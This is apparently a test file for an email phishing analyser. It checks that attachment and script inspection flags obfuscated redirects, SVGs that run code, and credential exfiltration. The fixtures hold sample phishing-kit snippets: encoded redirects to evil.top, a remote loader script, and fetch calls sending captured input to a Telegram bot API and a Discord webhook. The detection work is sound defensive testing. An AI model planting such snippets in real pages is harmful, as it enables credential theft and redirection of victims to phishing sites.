import assert from "node:assert/strict";
import { test } from "node:test";
import { strToU8 } from "fflate";
import { analyzeEmail } from "../analyze.ts";
import type { Attachment } from "../email.ts";
import { parseEmail } from "../mime/parse.ts";
import { parseTestHtml } from "../testing/dom.ts";
import { analyzeAttachments, attachmentFindings } from "./analyze.ts";
import { inspectWebScripts } from "./script.ts";

const b64 = (s: string) => Buffer.from(s).toString("base64");
const file = (filename: string, text: string, contentType = "application/octet-stream"): Attachment => ({
  filename, contentType, contentId: null, inline: false, data: strToU8(text),
});

test("decodes the address a script redirects to, without running it", () => {
  const info = inspectWebScripts(`<script>var u = atob("${b64("https://evil.top/o365/?e=x")}"); window.location.href = u;</script>`, "html");
  assert.equal(info.redirects, true);
  assert.deepEqual(info.urls, ["https://evil.top/o365/?e=x"]);
  const escaped = inspectWebScripts(`<script>location.replace(unescape("%68%74%74%70%73%3a%2f%2fevil.top%2f"))</script>`, "html");
  assert.deepEqual(escaped.urls, ["https://evil.top/"]);
  const chars = inspectWebScripts(`<script>window.open(String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,116,111,112,47))</script>`, "html");
  assert.deepEqual(chars.urls, ["https://evil.top/"]);
});

test("names exfiltration endpoints and remote script loaders", () => {
  const info = inspectWebScripts(`<form id=f></form><script src="https://cdn.kit.top/loader.js"></script><script>fetch("https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text="+p)</script>`, "html");
  assert.deepEqual(info.exfiltration, ["api.telegram.org/bot"]);
  assert.deepEqual(info.urls, ["https://cdn.kit.top/loader.js", "https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text="]);
});

test("an SVG that runs code is no longer just an image", () => {
  assert.deepEqual(inspectWebScripts(`<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>`, "svg").svgActive, []);
  assert.deepEqual(inspectWebScripts(`<svg onload="go()"><script>go=()=>0</script><foreignObject><form/></foreignObject></svg>`, "svg").svgActive, ["script", "event handler", "embedded HTML"]);
});

test("turns into findings, and the SVG's links into links", async () => {
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="https://evil.top/doc"><text>Open</text></a><script>top.location="https://evil.top/sso"</script></svg>`;
  const [report] = await analyzeAttachments([file("Facture.svg", svg, "image/svg+xml")]);
  assert.deepEqual(report.flags, ["web-page", "svg-script", "script-redirect"]);
  assert.ok(report.html?.includes("xlink:href"));
  assert.deepEqual(report.urls, ["https://evil.top/sso"]);
  assert.deepEqual(attachmentFindings([report]).map((f) => [f.id, f.severity, f.weight]), [
    ["attachment.svg-script", "high", 15],
    ["attachment.script-redirect", "medium", 12],
  ]);

  const [kit] = await analyzeAttachments([file("Voicemail.html", `<input type=password><script>fetch("https://discord.com/api/webhooks/1/x",{method:"POST"})</script>`)]);
  assert.deepEqual(attachmentFindings([kit]).map((f) => f.id), ["attachment.exfiltration"]);

  const [plain] = await analyzeAttachments([file("facture.html", "<html><body><p>Montant : 412,50 €</p><script>document.title='Facture'</script></body></html>")]);
  assert.deepEqual(plain.flags, ["web-page"]);
});

test("an SVG attachment's links are analysed like any other", async () => {
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="https://docusign.workers.dev/view"><text>View document</text></a></svg>`;
  const raw = [
    "From: a@b.example", "Content-Type: multipart/mixed; boundary=x", "", "--x", "Content-Type: text/plain", "", "See attached.",
    "--x", 'Content-Type: image/svg+xml; name="Doc.svg"', "Content-Disposition: attachment", "Content-Transfer-Encoding: base64", "",
    Buffer.from(svg).toString("base64"), "--x--", "",
  ].join("\r\n");
  const report = await analyzeEmail(parseEmail(new TextEncoder().encode(raw)), { orgDomains: [], parseHtml: parseTestHtml });
  assert.ok(report.links.links.some((l) => l.url.final === "https://docusign.workers.dev/view" && l.attachment === "Doc.svg"));
  assert.ok(report.findings.some((f) => f.id === "url.brand-in-domain"));
});
